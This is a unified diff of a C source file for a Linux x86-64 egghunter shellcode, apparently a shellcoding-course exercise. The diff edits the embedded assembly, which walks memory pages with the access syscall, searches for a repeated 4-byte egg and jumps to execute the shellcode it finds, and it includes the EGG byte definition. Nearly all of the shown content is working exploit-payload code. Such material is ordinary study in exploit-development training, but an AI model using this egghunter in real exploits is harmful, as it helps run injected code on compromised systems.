@@ -1,7 +1,6 @@
 #include<stdio.h>
 #include<stdlib.h>
 #include<string.h>
-
 /*
 ;The MIT License (MIT)
 
@@ -37,11 +36,8 @@ _start:
 	xor esi,esi	; F_OK = 0 for Access syscall
 	push 4
 	pop rbx		; number of bytes ahead to check
-	xor edx,edx
-	not edx
-	shr edx, 20
 nextpage:
-	or rdi, rdx
+	or di, 0xfff
 	inc rdi		; RDI is now set to the first byte of a new page of memory
 nextaddr:
 	push rdi	; RDI needs to be used for scasd as well
@@ -49,8 +45,8 @@ nextaddr:
 	push 21
 	pop rax
 	syscall
-	cmp al, 0xf2	;Check for our SIGSEGV indicator
 	pop rdi		; pop it back again or we will fill up the stack
+	cmp al, 0xf2	; Check for our SIGSEGV indicator
 	je nextpage
 	mov eax, 0x31ff31ff ; Our Egg	
 	scasd
@@ -58,6 +54,7 @@ nextaddr:
 	scasd		; we are assuming that if we found one egg, the next 4 bytes are okay to read
 	jnz nextaddr	; probably found our EggHunter so jump back
 	jmp rdi		; found our shellcode so execute it
+
 */
 
 #define EGG "\xff\x31\xff\x31"
